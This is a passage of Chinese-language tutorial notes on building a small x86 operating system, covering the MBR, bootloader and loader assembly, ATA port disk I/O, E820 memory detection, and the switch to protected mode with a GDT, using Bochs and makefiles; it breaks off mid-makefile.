不管定义了多少节名，最终要把属性相同的 section ，或者编译认为可以放到一块的，合并到一个大的 segment 中，也就是 elf 中说的 program header 中的项 MBR 、EBR、DBR、OBR是什么 MBR 是主引导记录(Main Boot Record)，存在与磁盘开始，扇区大小为512字节 446 字节的引导程序及参数： 64字节分区表 2字节结束标记：\\x55\\xaa OBR 内核加载器，存在于操作系统引导扇区，是操作系统引导程序(OS Boot Record) DBR Dos Boot Record MBR跳转引导指令 厂商信息、DOS版本模块 BIOS参数块BPB OBR 结束标记 \\x55\\xaa EBR Extra Boot Record，解决分区数量限制同时兼容MBR MBR EBR 是分区工具创建维护的，不属于操作系统管理的范围 grub multiboot 0x7c00 IBM PC 5150 DOS 1.0 [操作系统实现]MBR 一些问题 BIOS固定入口地址：0xFFFF0，此时CPU中的cs:ip为 0xF000:0xFFF0（实模式下cs要左移4位再相加） ？为什么是0x7C00 MBR程序是在内存的0x7c00中运行的，DOS1.0中的最小内存为32KB，所以选择最后1KB合理，32KB=0x8000B，1KB=0x400，所以程序开始是0x8000-0x100=0x7c00 如何找到系统调用相关说明 IBM PS 2 and PC BIOS Interface Technical Reference 主引导扇区结构 代码大小：446B 硬盘分区表：64B=4*16B magic_num：0xaa55 - 0x55 0xaa 主要功能 ​ 读取内核加载其并执行 实验 按照书上配置好环境 配置文件 123456789101112131415161718192021222324252627#Bochs运行中使用的内存，设置为32Mmegs: 32#设置真实机器的BIOS和VGA BIOS#修改成你们对应的地址romimage: file=/home/joe1sn/Desktop/real_os/bochs/share/bochs/BIOS-bochs-latestvgaromimage: file=/home/joe1sn/Desktop/real_os/bochs/share/bochs/VGABIOS-lgpl-latest#设置Bochs所使用的磁盘#设置启动盘符boot: disk#设置日志文件的输出log: bochs.out#开启或关闭某些功能，修改成你们对应的地址mouse: enabled=0keyboard:keymap=/home/joe1sn/Desktop/real_os/bochs/share/bochs/keymaps/x11-pc-us.map#硬盘设置ata0: enabled=1, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14ata0-master: type=disk, path=&quot;hd60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63#ata0-master: type=disk, path=&quot;gp60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63#增加bochs对gdb的支持，我们在这里不使用，所以注释掉了#gdbstub: enabled=1, port=1234, text_base=0, data_base=0, bss_base=0 源代码 12345678910111213141516171819202122232425262728293031323334353637;MBR;--------------------------------SECTION MBR vstart=0x7c00; mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00;使用6上卷屏幕，实现清屏;------------------------------------------------------- mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;;;;; 得到光标位置 mov ah, 3 ;3号功能是获取光标位置 mov bh, 0 ;存储带获取光标的页号 int 0x10;;;;; 打印字符串 mov ax, message mov bp, ax mov cx, 5 mov ax, 0x1301 mov bx, 0x2 int 0x10 jmp $ ;pause message db &quot;MetOS&quot;;要打印的字符串 times 510-($-$$) db 0 db 0x55,0xaa 编译 1nasm -o mbr.bin mbr.asm 设置基础BOCHS硬盘 1./bin/bximage -hd -mode=&quot;flat&quot; -size=60 -q hd60M.img ata0-master: type=disk, path=“master.img”, mode=flat, cylinders=121, heads=16, spt=63 按照格式写入硬盘文件 1dd if=./mbr.bin of=/home/joe1sn/Desktop/real_os/bochs/hd60M.img bs=512 count=1 conv=notrunc 使用显卡显示 IA32 体系系统中，因为用于存储端口号的寄存器是 16 位的，所以最大有 65536 个端口，即 65535 要是通过内存映射，端口就可以用 mov 指令来操作。但由于用的是独立编址，所以就不能把它当作内存来操作，因此 CPU 提供了专门的指令来干这事，in和out in用于读数据 out用于写数据 外部设备BIOS是：0xC000道0xCFFF 显存是0xB8000到0xBFFFF 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445;Main Bootloader Program;--------------------------------SECTION MBR vstart=0x7c00 mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00 mov ax,0xb800 mov gs,ax;clear screen using int_6;-----------------------------------------------------------;INT 0x10 function_code:6 funcion:uproll the screen;-----------------------------------------------------------;INPUT mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;using gpu mov byte [gs:0x00],&#x27;M&#x27; mov byte [gs:0x01],0x04 ;green back_flash mov byte [gs:0x02],&#x27;e&#x27; mov byte [gs:0x03],0x04 mov byte [gs:0x04],&#x27;l&#x27; mov byte [gs:0x05],0x04 mov byte [gs:0x06],&#x27;t&#x27; mov byte [gs:0x07],0x04 mov byte [gs:0x08],&#x27;O&#x27; mov byte [gs:0x09],0x04 mov byte [gs:0x0a],&#x27;S&#x27; mov byte [gs:0x0b],0x04 jmp $ ;pause times 510-($-$$) db 0 db 0x55,0xaa BOCHS调试 Debug Control q|quit|exit set show show mode 每次CPU变换模式提醒 show int 每次中断时提醒 show call 函数调用时提醒 u|disasm [/num] [start] [end] ​ 反汇编 start到end代码，num是反汇编指令数 Execution control c| cont| continue s| step [count] p| n| next Breakpoint management vb| vbreak 按照虚拟地址下断点 lb| break[addr]线性地址添加断点 pb| pbreak| b| break [addr] 物理地址添加断点 sb [delta] delta 表示再执行delta条指令程序就中断 watch unwatch blist 显示所有断点信息 bpd| bpe [n]禁用断点 d| del| delete[n] 删除某断点 MBR使用硬盘-交出控制权 MBR 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117;Main Bootloader Program;--------------------------------%include &quot;boot.inc&quot;SECTION MBR vstart=0x7c00 mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00 mov ax,0xb800 mov gs,ax;clear screen using int_6;-----------------------------------------------------------;INT 0x10 function_code:6 funcion:uproll the screen;-----------------------------------------------------------;INPUT mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;using gpu mov byte [gs:0x00],&#x27;M&#x27; mov byte [gs:0x01],0x04 ;green back_flash mov byte [gs:0x02],&#x27;e&#x27; mov byte [gs:0x03],0x04 mov byte [gs:0x04],&#x27;l&#x27; mov byte [gs:0x05],0x04 mov byte [gs:0x06],&#x27;t&#x27; mov byte [gs:0x07],0x04 mov byte [gs:0x08],&#x27;O&#x27; mov byte [gs:0x09],0x04 mov byte [gs:0x0a],&#x27;S&#x27; mov byte [gs:0x0b],0x04 mov eax,LOADER_START_SECTOR ;起始扇区lba地址 mov bx,LOADER_BASE_ADDR ;写入磁盘的地址 mov cd,1 ;代读入的扇区数 call rd_disk_m_16 jmp LOADER_BASE_ADDR;读取硬盘的第n个扇区rd_disk_m_16:; eax=LBA扇区号; ebx=将数据写入的内存地址; ecx=读入的扇区数 mov esi,eax ;备份eax mov di,cx ;备份cx;读写硬盘;------S1:设置要读取扇区数 mov dx,0x1f2 mov al,cl out dx,al ;代读取的扇区数 mov eax,esi ;恢复ax;------S2:将LBA地址写入0x1f3-0x1f6 ;LBA 地址7-0位写入端口 0x1f3 mov dx,0x1f3 out dx,al ;LBA 地址15-8 位写入端口 0x1f4 mov cl,8 shr eax,cl mov dx,0x1f4 out dx,al ;LBA 地址23-16 位写入端口 0x1f5 shr eax,cl mov dx,0x1f5 out dx,al shr eax,cl and al,0x0f ;LBA 24-27 bits or al,0xe0 ;set 7-4 = 1110，表示LBA模式 mov dx,0x1f6 out dx,al;------S3:0x1f7端口写入读命令,0x20 mov dx,0x1f7 mov al,0x20 out dx,al;------S4:检测硬盘状态 .not_ready: nop in al,dx and al,0x88 ;第4位为1表示硬盘控制器已准备好数据传输，第7位为1表示硬盘忙 cmp al,0x08 jnz .not_ready;------S5:从0x1f0读取数据 mov ax,di mov dx,256 mul dx mov cx,ax mov dx,0x1f0 .go_on_ready: in ax,dx mov [bx],ax add bx,2 loop .go_on_ready ret ;jmp $ ;pause times 510-($-$$) db 0 db 0x55,0xaa 宏LOADER_START_SECTOR就是0x2，表示我们要向磁盘第三个扇区（第一个是0x0）读loader，LOADER_BASE_ADDR就是loader被写入的地址0x900。 Loader 12345678910111213141516171819202122232425262728%include &quot;boot.inc&quot;section loader vstart=LOADER_BASE_ADDRmov byte [gs:0x00] ,&#x27;2&#x27;mov byte [gs:0x01] ,0xA4mov byte [gs:0x02] ,&#x27; &#x27;mov byte [gs:0x03] ,0xA4mov byte [gs:0x04] ,&#x27;L&#x27;mov byte [gs:0x05] ,0xA4mov byte [gs:0x06] ,&#x27;o&#x27;mov byte [gs:0x07] ,0xA4mov byte [gs:0x08] ,&#x27;a&#x27;mov byte [gs:0x09] ,0xA4mov byte [gs:0x0a] ,&#x27;d&#x27;mov byte [gs:0x0b] ,0xA4mov byte [gs:0x0c] ,&#x27;e&#x27;mov byte [gs:0x0d] ,0xA4mov byte [gs:0x0e] ,&#x27;r&#x27;mov byte [gs:0x0f] ,0xA4jmp $ 编译后写入第二扇区 1dd if=./MBR/loader.bin of=/home/joe1sn/Desktop/real_os/bochs/disk60M.img bs=512 count=1 seek=2 conv=notrunc 总结 **1.MBR执行流程 ** 从内存最低1KB位置出发，调用BIOS的中断向量表实现 2.使用外部IO设备 每个设备在CPU实模式中有内存和端口，按照内存访问+向量表调用可以实现 3.使用IO启动 开始和之前相同 ​ 第1步：设置要读取的扇区数 ​ 第2步：将LBA地址存入0x1f3 ~ 0x1f6 ​ 第3步：向0x1f7端口写入读命令，0x20 ​ 第4步：检测硬盘状态 ​ 第5步：从0x1f0端口读数据 先选择通道，往该通道的 sector count 寄存器中写入待操作的扇区数 往该通道上的三个 LBA 寄存器写入扇区起始地址的低 24 位 往 device 寄存器中写入 LBA 地址的 24-27 位，并置第6位为1，使其为 LBA 模式，设置第4位，选择操作的硬盘（master 硬盘或 slave 硬盘） 往该通道上的 command 寄存器写入操作命令 读取该通道上的 status 寄存器，判断硬盘工作是否完成 如果以上步骤是读硬盘，进入下 个步骤。否则，完工 将硬盘数据读出 数据传送的方式就是操作系统学的了 [操作系统实现]从usb启动 首先把usb插入ubuntu查看 1lsblk #查看挂载 格式化usb 1sudo fdisk /dev/sdb d：删除分区 可以写makefile如下： 1234567891011121314151617181920212223boot.bin: boot.asm nasm -f bin boot.asm -o boot.binmaster.img: boot.bin yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q master.img dd if=./boot.bin of=master.img bs=512 count=1 conv=notrunc.PHONY: cleanclean: rm -rf *.bin rm -rf *.img.PHONY: usbusb: boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bin.PHONY: bochsbochs: master.img bochs -q 源代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00; xchg bx, bx; bochs魔数断点mov si, bootingcall print;程序悬停jmp $print: mov ah, 0xe.next: mov al, [si] cmp al, 0 jz .done int 0x10 inc si jmp .next.done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;填充times 510-($-$$) db 0db 0x55,0xaa 弹出过后从VMware创建新的虚拟机启动 注：要在插入usb后启动vmware，否则vmware无法识别到usb [操作系统实现]实模式下的print实现 参数： ah：0xe al：字符 int 0x10： 系统调用 函数 1234567891011print: mov ah, 0xe ;功能参数.next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个.done: ret 完整代码 1234567891011121314151617181920212223242526272829303132333435363738394041[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00xchg bx, bx; bochs魔数断点mov si, bootingcall print;程序悬停jmp $print: mov ah, 0xe ;功能参数.next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个.done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;填充times 510-($-$$) db 0db 0x55,0xaa make bochs编译 [操作系统实现]硬盘读写 简单的磁盘结构 扇区：硬盘读写的最小单位，最多256，最小1个 性能瓶颈：机械臂的寻道时间 一般磁道有63个扇区（由于BIOS最大支持） 一般外侧读写速度最快 IDE / ATA PIO Mode PIO：Port Input Output Port更多指的是外部设备内部的寄存器 IDE：Intergrated Drive Electronics 集成电子驱动器 （西部数据） ATA（PATA）：Advanced Technology Attachment（ANSI标准） SATA 硬盘读写模式 CHS： Cylinder / Head / Sector | 柱面 / 磁道 / 扇区 LBA： Logical Block Address | 逻辑块地址 LBA28：总共访问 128G的磁盘空间 两个通道：Primary Secondary 0x1F0：16bits，用于读写数据 0x1F1：用于检测前一个指令的错误 0x1F2：读写扇区的数量，最多256 0x1F3：起始扇区 0 ~ 7 位 0x1F4：起始扇区 8~15 位 0x1F5：起始扇区 16 ~ 23 位 0x1F6： 0 ~ 3：起始扇区 24 ~ 27 位 4：0–&gt;master主盘；1–&gt;slave从盘 6：0 CHS模式；1 LBA模式 5、7：固定 1 0x1F7： out操作 0xEC：识别硬盘 0x20：读硬盘 0x30：写硬盘 int操作 0 ERROR 3 DRQ 数据准备完毕 7 BSY 硬盘繁忙 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00mov edi, 0x1000 ; 读到的目标内存mov ecx, 0 ; 起始扇区mov bl,1 ;扇区数量call read_diskxchg bx, bx; bochs魔数断点mov edi, 0x1000 ; src的目标内存mov ecx, 2 ; 起始扇区mov bl,1 ;扇区数量call write_diskmov si, bootingcall print;程序悬停jmp $;读取硬盘read_disk: ;设置读写扇区数量 ;0x1f2端口=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3端口= 00000000 inc dx; 0x1f3 mov al, cl ;起始扇区的前8位 out dx, al ;0x1f4端口= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;起始扇区的中8位 out dx, al ;0x1f5端口= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;起始扇区的高8位 out dx, al ;起始扇区24位：00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;高4位置0 mov al, 0b1110_0000; or al, cl; cl拼接到al后面 out dx, al;主盘 LBA模式设置 ;0x1f7端口= 0x20;表示读硬盘 inc dx;0x1f7 mov al,0x20;读硬盘 out dx,al xor ecx, ecx;清空exc mov cl, bl;得到读写扇区的数量 .read: push cx;保存cx call .waits;等待数据准备完毕 call .reads;读取一个扇区 pop cx loop .read ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; and al, 0b1000_1000; 与操作，只剩下3,7位 cmp al, 0b0000_1000; 比较3,7位，确保硬盘准备就绪 jnz .check ret .reads: mov dx, 0x1f0 mov cx, 256;一个扇区是256字 .readw: in ax, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; mov [edi], ax add edi, 2 loop .readw ret;写硬盘write_disk: ;设置读写扇区数量 ;0x1f2端口=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3端口= 00000000 inc dx; 0x1f3 mov al, cl ;起始扇区的前8位 out dx, al ;0x1f4端口= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;起始扇区的中8位 out dx, al ;0x1f5端口= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;起始扇区的高8位 out dx, al ;起始扇区24位：00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;高4位置0 mov al, 0b1110_0000; or al, cl; cl拼接到al后面 out dx, al;主盘 LBA模式设置 ;0x1f7端口= 0x20;表示读硬盘 inc dx;0x1f7 mov al,0x30;读硬盘 out dx,al xor ecx, ecx;清空exc mov cl, bl;得到读写扇区的数量 .write: push cx;保存cx call .writes;写一个扇区 call .waits;等待繁忙 pop cx loop .write ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; and al, 0b1000_0000; 与操作，只剩下7位 cmp al, 0b0000_0000; 比较7位，确保硬盘准备就绪 jnz .check ret .writes: mov dx, 0x1f0 mov cx, 256;一个扇区是256字 .writew: mov ax, [edi] out dx, ax jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; add edi, 2 loop .writew ret;实模式的打印print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;填充times 510-($-$$) db 0db 0x55,0xaa 操作系统实现-内核加载器 基本步骤 写内核加载器 loader 将loader加载到硬盘 在主引导扇区读入 检测正确性 x86实模式下内存布局 假设我们的bootloader如下 12345678910111213141516171819202122[org 0x1000];实模式下的其实地址dw 0x55aa; 魔数，用于判断错误mov si,loadingcall printjmp $print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retloading: db &quot;Kernel Booting Up...&quot;,10,13,0 这是可以修改下makefile文件 1234567891011121314151617181920212223242526%.bin: %.asm nasm -f bin $&lt; -o $@master.img: boot.bin loader.bin yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q master.img dd if=./boot.bin of=master.img bs=512 count=1 conv=notrunc dd if=./loader.bin of=master.img bs=512 count=4 seek=2 conv=notrunc.PHONY: cleanclean: rm -rf *.bin rm -rf *.img.PHONY: usbusb: boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bin.PHONY: bochsbochs: master.img bochs -q 这样我们使用make loader.bin就能生成loader.bin了 同时：dd if=./loader.bin of=master.img bs=512 count=4 seek=2 conv=notrunc将loader写到第二扇区，写512*4字节大小 接着我们修改主程序，逻辑如下 读取第二扇区到实模式下的可用内存并验证&quot;\\x55\\xaa&quot;校验位 jmp到内存执行 得到新的boot.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00mov si, bootingcall printmov edi, 0x1000 ; 读到的目标内存mov ecx, 2 ; 起始扇区mov bl,4 ;扇区数量call read_diskcmp word [0x1000], 0x55aajnz errorjmp 0:0x1002;程序悬停jmp $;读取硬盘read_disk: ;设置读写扇区数量 ;0x1f2端口=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3端口= 00000000 inc dx; 0x1f3 mov al, cl ;起始扇区的前8位 out dx, al ;0x1f4端口= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;起始扇区的中8位 out dx, al ;0x1f5端口= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;起始扇区的高8位 out dx, al ;起始扇区24位：00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;高4位置0 mov al, 0b1110_0000; or al, cl; cl拼接到al后面 out dx, al;主盘 LBA模式设置 ;0x1f7端口= 0x20;表示读硬盘 inc dx;0x1f7 mov al,0x20;读硬盘 out dx,al xor ecx, ecx;清空exc mov cl, bl;得到读写扇区的数量 .read: push cx;保存cx call .waits;等待数据准备完毕 call .reads;读取一个扇区 pop cx loop .read ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; and al, 0b1000_1000; 与操作，只剩下3,7位 cmp al, 0b0000_1000; 比较3,7位，确保硬盘准备就绪 jnz .check ret .reads: mov dx, 0x1f0 mov cx, 256;一个扇区是256字 .readw: in ax, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; mov [edi], ax add edi, 2 loop .readw ret;写硬盘write_disk: ;设置读写扇区数量 ;0x1f2端口=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3端口= 00000000 inc dx; 0x1f3 mov al, cl ;起始扇区的前8位 out dx, al ;0x1f4端口= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;起始扇区的中8位 out dx, al ;0x1f5端口= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;起始扇区的高8位 out dx, al ;起始扇区24位：00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;高4位置0 mov al, 0b1110_0000; or al, cl; cl拼接到al后面 out dx, al;主盘 LBA模式设置 ;0x1f7端口= 0x20;表示读硬盘 inc dx;0x1f7 mov al,0x30;读硬盘 out dx,al xor ecx, ecx;清空exc mov cl, bl;得到读写扇区的数量 .write: push cx;保存cx call .writes;写一个扇区 call .waits;等待繁忙 pop cx loop .write ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; and al, 0b1000_0000; 与操作，只剩下7位 cmp al, 0b0000_0000; 比较7位，确保硬盘准备就绪 jnz .check ret .writes: mov dx, 0x1f0 mov cx, 256;一个扇区是256字 .writew: mov ax, [edi] out dx, ax jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; add edi, 2 loop .writew ret;实模式的打印print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\rerror: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;填充times 510-($-$$) db 0db 0x55,0xaa 同时可以修改loader.asm的校验位，查看报错是否正常 更改loader.bin的时候要重新make master.img让新的loader.bin写入磁盘文件 操作系统实现-内存检测 实模式下在进入保护模式之前要检测内存是否能够被使用，并且更好的规划内存空间。 如何实现内存检测 BIOS的int 0x15调用、0xe820子功能号、20B的ards(Address Range Descriptor Structure)结构体大小 BIOS会返回一个ards结构体到指定的ards_buffer中，结构体内容如图 其中的Type字段是用来描述这段内存的类型，这里所谓的类型是说明这段内存的用途，是可以被操作系统使用，还是保留起来不能用 Type值 名称 含义 1 AddressRangeMemory 该内存可以被操作系统使用 2 AddressRangeReserved 内存使用中，或被系统保留，操作系统不能使用 其他 undefine 未定义 源代码实现 在boot中添加loader失败语句 123456error: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0 在loader最后结尾定义ards_count与ards_buffer 123ards_count: dw 0ards_buffer: 在loader中编写内存启动程序 具体调用情况如下 123456789101112131415161718192021222324252627282930313233343536373839detect_mem: xor ebx, ebx mov ax, 0 mov es, ax;es:di结构体缓存位置 mov edi, ards_buffer;结构体内存位置 mov edx, 0x534d4150;SMAP签名.next: mov eax, 0xe820 ;子功能号 mov ecx, 20 ;ards结构体大小，单位：字节 int 0x15 ;调用0x15内存检测功能 ;若CF=1，则表示出错 jc error ;否则将缓存指针指向下一个结构体 add di, cx inc word [ards_count] ;将结构体数量+1 cmp ebx, 0 ;0为检测结束 jnz .next mov si, detecting call print; mov cx, [ards_buffer] ;结构体数量; mov si, 0 ;结构体指针; .show:; mov eax, [si + ards_buffer]; mov ebx, [8 + si + ards_buffer]; mov edx, [16 + si + ards_buffer]; add si,20; xchg bx,bx; loop .show ;loop是根据cx的值循环jmp $ 写loader报错和内存检测完成功能 123456789detecting: db &quot;Detecting Memeory Success...&quot;,10,13,0 error: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Error&quot;,10,13,0 激活.show那段被注释的代码可以在bochs调试看到每次调用返回地ARDS结构体内容 参考 x86的E820h子功能 一步步编写操作系统 33 利用bios中断0x15子功能0xe820获取内存 操作系统实现-保护模式与全局描述符 8086 1M 内存，实模式，可以完全控制计算机 80286 保护模式 16位 保护模式 IT 寄存器 Register / 有些寄存器只能操作系统使用 高速缓存 Cache 内存 / 描述符 外部设备 / 硬盘 int/out 全局描述符 80386 描述符 全局描述符表 GDT 1descriptor gdt[8192]; 0 必须全为 0-null 描述符 8191 通用 12lgdt [gdt_ptr]; //load gdtsgdt [gdt_ptr]; // save gdt 段选择子 只需要一个代码段 需要一个或多个段 加载到段寄存器中 / 校验特权等级 123456typedef struct selector&#123; unsigned char RPL :2; unsigned char TI :1; //local descriptor table unsigned short index :13;&#125; __attribute__((packed)) selector; cs / ds / es /gs fs / gs A20线 参考第一篇文章，来源于8086最开始只有20条地址线 打开是修改0x92端口 PE Protect Enable cr0寄存器 0 位 置 1 loader.asm 准备工作，定义一些常量 1234567891011121314151617181920212223242526272829code_selector equ (1&lt;&lt;3);代码段选择子data_selector equ (2&lt;&lt;3);数据段选择子memeory_base equ 0;内存起始地址 基地址memeory_limit (1024 * 1024 * 1024 *4) / (1024*4) - 1; 内存界限 4G/4K -1;;;;;;;;;;;;gdt[2]gdt_ptr: dw (gdt_end-gdt_base)-1 dd gdt_basegdt_base: dd 0,0 ;null描述符gdt_code: dw memeory_limit &amp; 0xffff ; 段界限 0-15 dw memeory_base &amp; 0xffff ; 基地址 0-16 db memeory_base&gt;&gt;16 &amp; 0xff ; 基地址 0-16 db 0b_1_00_1_1_0_1_0 ; 存在-dlp_0-S_代码-非依从-可读-没有被访问过 ; 4k-32位-不是64位-avaliable_0-段界限16~19 db 0b_1_1_0_0_0000 | (memeory_limit &gt;&gt; 16) &amp;0xf db (memeory_base &gt;&gt; 24) &amp; 0xffgdt_data: dw memeory_limit &amp; 0xffff ; 段界限 0-15 dw memeory_base &amp; 0xffff ; 基地址 0-16 db memeory_base&gt;&gt;16 &amp; 0xff ; 基地址 0-16 ; 存在-dlp_0-S_数据-非依从向上-可读-没有被访问过 db 0b_1_00_1_0_0_1_0 ; 4k-32位-不是64位-avaliable_0-段界限16~19 db 0b_1_1_0_0_0000 | (memeory_limit &gt;&gt; 16) &amp;0xf db (memeory_base &gt;&gt; 24) &amp; 0xff gdt_end: 准备保护模式 12345678910111213141516171819prepare_protected_mode: xchg bx,bx cli;关闭中断 ; 打开A20线 in al, 0x92 or al, 0b10 out 0x92, al ;加载GDT lgdt [gdt_ptr] ;启动保护模式 mov eax, cr0 or eax, 1 mov cr0, eax ;用跳转刷新缓存，启用保护模式 jmp dword code_selector:protected_mode 进入保护模式 123456789101112131415protected_mode: xchg bx, bx mov ax, data_selector ;初始化段寄存器 mov ds, ax mov es, ax mov fs, ax mov gs, ax mov ss, ax mov esp, 0x10000; 栈顶 mov byte [0xb8000], &#x27;P&#x27; mov byte [0x200000], &#x27;P&#x27;jmp $ 参考 https://www.bilibili.com/video/BV1bT4y1k7EQ 内核第二讲,内存保护的实现,以及知识简介,局部描述符,全局描述符. 操作系统实现-进入内核 在上一篇文章中我们实现了进入保护模式，那么下一步就是进入操作系统内核 这个时候我们就可以直接给寄存器赋值，能使用更大的内存地址空间 文件整理 首先对整个文件夹目录结构如下 123456789101112131415161718192021joe1sn@ubuntu:~/Desktop/os2$ tree.├── build│ ├── boot│ │ ├── boot.bin│ │ └── loader.bin│ ├── kernel│ │ └── start.o│ ├── kernel.bin│ ├── master.img│ ├── system.bin│ └── system.map└── src ├── bochsrc ├── boot │ ├── boot.asm │ └── loader.asm ├── build ├── kernel │ └── start.asm └── makefile build 所有最终生成的文件都会放在这里 boot：MBR以及boot相关二进制文件 kernel：操作系统启动的相关二进制文件 src 源代码 bochsrc：bochs配置文件 boot：MBR以及boot相关源代码 kenel：操作系统源代码 makefile：项目编译文件 对应修改的makefile 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152BUILD:=../buildSRC:=.ENTRYPOINT:=0x10000$(BUILD)/boot/%.bin: $(SRC)/boot/%.asm $(shell mkdir -p $(dir $@)) nasm -f bin $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.asm $(shell mkdir -p $(dir $@)) nasm -f elf32 $&lt; -o $@$(BUILD)/kernel.bin: 